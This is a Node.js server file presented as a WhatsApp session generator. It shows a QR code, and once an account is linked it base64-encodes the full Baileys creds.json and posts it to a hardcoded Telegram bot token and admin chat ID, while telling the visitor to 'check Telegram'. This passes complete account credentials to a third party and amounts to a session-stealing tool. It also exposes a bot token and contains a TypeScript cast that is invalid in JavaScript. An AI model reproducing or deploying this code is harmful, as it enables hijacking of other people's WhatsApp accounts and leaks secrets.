// server.js - WhatsApp Session Generator with Baileys
// Developed by @Asifsakhani786
// Deploy on Railway - Generates QR, sends creds to Telegram

const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const qrcode = require('qrcode');
const { Boom } = require('@hapi/boom');

// ==================== CONFIGURATION ====================
const PORT = process.env.PORT || 3000;
const SESSION_DIR = './temp_qr_session';
const BOT_TOKEN = "8408756846:AAGe3KH0ssai2xRwV2cUKTer5A6xeEl2uQo";
const ADMIN_ID = "8093002631";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// ==================== EXPRESS SERVER ====================
const app = express();

// Clean and recreate session directory
function cleanSessionDir() {
    try {
        if (fs.existsSync(SESSION_DIR)) {
            fs.rmSync(SESSION_DIR, { recursive: true, force: true });
            console.log('[✓] Old session directory removed');
        }
        fs.mkdirSync(SESSION_DIR, { recursive: true });
        console.log('[✓] New session directory created');
    } catch (err) {
        console.error('[✗] Error cleaning session dir:', err.message);
    }
}

// Send Base64 creds to Telegram
async function sendToTelegram(base64Data) {
    try {
        const message = `
╔═══════════════════════════════════════╗
║   📱 <b>WHATSAPP SESSION GENERATED</b>  ║
╠═══════════════════════════════════════╣
║  ┌─────────────────────────────────┐  ║
║  │ ✅ Session created successfully │  ║
║  │ 📌 Copy the Base64 string below │  ║
║  └─────────────────────────────────┘  ║
╠═══════════════════════════════════════╣
║  <code>${base64Data}</code>             ║
╠═══════════════════════════════════════╣
║  🔹 <b>Developer</b> @Asifsakhani786      ║
╚═══════════════════════════════════════╝
        `;

        await axios.post(TELEGRAM_API, {
            chat_id: ADMIN_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('[✓] Session sent to Telegram');
        return true;
    } catch (err) {
        console.error('[✗] Failed to send to Telegram:', err.message);
        return false;
    }
}

// Read creds.json and convert to Base64
function getCredsBase64() {
    const credsPath = path.join(SESSION_DIR, 'creds.json');
    if (!fs.existsSync(credsPath)) {
        return null;
    }
    try {
        const creds = fs.readFileSync(credsPath, 'utf-8');
        return Buffer.from(creds).toString('base64');
    } catch (err) {
        console.error('[✗] Error reading creds:', err.message);
        return null;
    }
}

// ==================== QR CODE GENERATION ====================
let currentQR = null;
let isConnected = false;
let isProcessing = false;

async function startWhatsAppSession() {
    if (isProcessing) return;
    isProcessing = true;

    try {
        cleanSessionDir();

        const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);

        const sock = makeWASocket({
            auth: state,
            printQRInTerminal: true,
            browser: ['WhatsApp Session Generator', 'Chrome', '120.0.0.0']
        });

        // Handle QR Code
        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;

            if (qr) {
                currentQR = qr;
                console.log('[✓] QR Code generated');
                // Generate QR as base64 for web display
                try {
                    const qrBase64 = await qrcode.toDataURL(qr);
                    currentQR = qrBase64;
                } catch (err) {
                    console.error('[✗] QR generation error:', err.message);
                }
            }

            if (connection === 'close') {
                const statusCode = (lastDisconnect?.error as Boom)?.output?.statusCode;
                const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
                console.log(`[!] Connection closed. Reconnect: ${shouldReconnect}`);
                
                if (statusCode === DisconnectReason.loggedOut) {
                    console.log('[✗] Logged out. Cleanup...');
                    cleanSessionDir();
                }
                
                isConnected = false;
                isProcessing = false;

                if (shouldReconnect) {
                    console.log('[↻] Reconnecting...');
                    setTimeout(() => startWhatsAppSession(), 3000);
                }
            }

            if (connection === 'open') {
                isConnected = true;
                console.log('[✓] WhatsApp connected successfully!');

                // Wait a moment for creds to be saved
                setTimeout(async () => {
                    const base64Creds = getCredsBase64();
                    if (base64Creds) {
                        await sendToTelegram(base64Creds);
                        console.log('[✓] Session sent. Closing connection...');
                        
                        // Cleanup and close
                        isProcessing = false;
                        setTimeout(() => {
                            process.exit(0);
                        }, 2000);
                    } else {
                        console.log('[✗] Creds not found after connection');
                        isProcessing = false;
                    }
                }, 3000);
            }
        });

        // Save creds when updated
        sock.ev.on('creds.update', async () => {
            await saveCreds();
            console.log('[✓] Creds updated');
        });

        // Keep socket alive
        sock.ev.on('connection.update', () => {});
        
    } catch (err) {
        console.error('[✗] Session error:', err.message);
        isProcessing = false;
        setTimeout(() => startWhatsAppSession(), 5000);
    }
}

// ==================== EXPRESS ROUTES ====================

// Serve static HTML page with QR
app.get('/', (req, res) => {
    const html = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Session Generator</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a1a;
            color: #00ff88;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: #111128;
            border: 1px solid #00ff8844;
            border-radius: 16px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        h1 {
            font-weight: 300;
            font-size: 24px;
            letter-spacing: 2px;
            margin-bottom: 10px;
        }
        .sub {
            color: #666;
            font-size: 13px;
            margin-bottom: 25px;
        }
        #qr-container {
            background: #0a0a20;
            border: 2px solid #00ff8844;
            border-radius: 12px;
            padding: 20px;
            margin: 15px 0;
            min-height: 280px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #qr-container img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
        }
        #status {
            color: #888;
            font-size: 13px;
            margin-top: 10px;
            padding: 8px;
            border-radius: 6px;
            background: #0a0a20;
        }
        #status.success { color: #00ff88; }
        #status.error { color: #ff4444; }
        #status.loading { color: #ffd93d; }
        .footer {
            color: #333;
            font-size: 11px;
            margin-top: 20px;
        }
        .footer a { color: #00ff88; text-decoration: none; }
        .refresh-btn {
            background: transparent;
            border: 1px solid #00ff8844;
            color: #00ff88;
            padding: 8px 20px;
            border-radius: 6px;
            cursor: pointer;
            font-family: inherit;
            font-size: 12px;
            margin-top: 10px;
            transition: 0.3s;
        }
        .refresh-btn:hover {
            background: #00ff8822;
        }
        .badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            margin-top: 8px;
        }
        .badge.online { background: #00ff8844; color: #00ff88; }
        .badge.offline { background: #ff444444; color: #ff4444; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📱 WhatsApp Session</h1>
        <div class="sub">Scan QR to generate session</div>
        
        <div id="qr-container">
            <div id="qr-placeholder" style="color:#444;font-size:14px;">
                ⏳ Generating QR code...
            </div>
        </div>
        
        <div id="status" class="loading">⏳ Waiting for QR...</div>
        <div>
            <span id="badge" class="badge offline">● OFFLINE</span>
        </div>
        
        <button class="refresh-btn" onclick="refreshQR()">⟳ Refresh QR</button>
        <div class="footer">Developed by <a href="#">@Asifsakhani786</a></div>
    </div>

    <script>
        let qrInterval = null;
        let refreshCount = 0;

        function fetchQR() {
            fetch('/qr')
                .then(res => res.json())
                .then(data => {
                    const container = document.getElementById('qr-container');
                    const status = document.getElementById('status');
                    const badge = document.getElementById('badge');

                    if (data.qr) {
                        container.innerHTML = `<img src="${data.qr}" alt="QR Code">`;
                        status.textContent = '📱 Scan QR with WhatsApp';
                        status.className = 'success';
                        badge.textContent = '● ONLINE';
                        badge.className = 'badge online';
                        refreshCount = 0;
                    } else if (data.connected) {
                        container.innerHTML = '<div style="color:#00ff88;font-size:18px;">✅ Connected!</div>';
                        status.textContent = '✅ Session generated! Check Telegram.';
                        status.className = 'success';
                        badge.textContent = '● CONNECTED';
                        badge.className = 'badge online';
                        clearInterval(qrInterval);
                    } else {
                        container.innerHTML = '<div style="color:#666;font-size:14px;">⏳ Waiting for QR...</div>';
                        status.textContent = '⏳ Loading...';
                        status.className = 'loading';
                        badge.textContent = '● OFFLINE';
                        badge.className = 'badge offline';
                    }
                })
                .catch(() => {
                    // Keep showing last QR
                });
        }

        function refreshQR() {
            refreshCount++;
            fetchQR();
            // Reset interval on manual refresh
            if (qrInterval) {
                clearInterval(qrInterval);
                qrInterval = setInterval(fetchQR, 20000);
            }
        }

        // Fetch immediately
        fetchQR();

        // Auto-refresh every 20 seconds
        qrInterval = setInterval(fetchQR, 20000);

        // Also refresh on page visibility change
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                fetchQR();
            }
        });
    </script>
</body>
</html>
    `;
    res.send(html);
});

// QR endpoint for AJAX
app.get('/qr', (req, res) => {
    if (isConnected) {
        return res.json({ connected: true });
    }
    if (currentQR && currentQR.startsWith('data:image')) {
        return res.json({ qr: currentQR });
    }
    res.json({ qr: null });
});

// Health check endpoint for Railway
app.get('/health', (req, res) => {
    res.status(200).json({
        status: 'ok',
        connected: isConnected,
        timestamp: new Date().toISOString()
    });
});

// ==================== START SERVER ====================

app.listen(PORT, '0.0.0.0', () => {
    console.log(`[✓] Server running on port ${PORT}`);
    console.log(`[✓] Health check: http://localhost:${PORT}/health`);
    console.log('[✓] Starting WhatsApp session...');
    
    // Start WhatsApp session after server is up
    setTimeout(() => {
        startWhatsAppSession();
    }, 2000);
});

// ==================== CLEANUP ON EXIT ====================

process.on('SIGINT', () => {
    console.log('\n[!] Shutting down...');
    cleanSessionDir();
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log('\n[!] Shutting down...');
    cleanSessionDir();
    process.exit(0);
});

// Handle uncaught errors
process.on('uncaughtException', (err) => {
    console.error('[✗] Uncaught Exception:', err.message);
    // Don't exit, keep running
});

process.on('unhandledRejection', (err) => {
    console.error('[✗] Unhandled Rejection:', err.message);
});
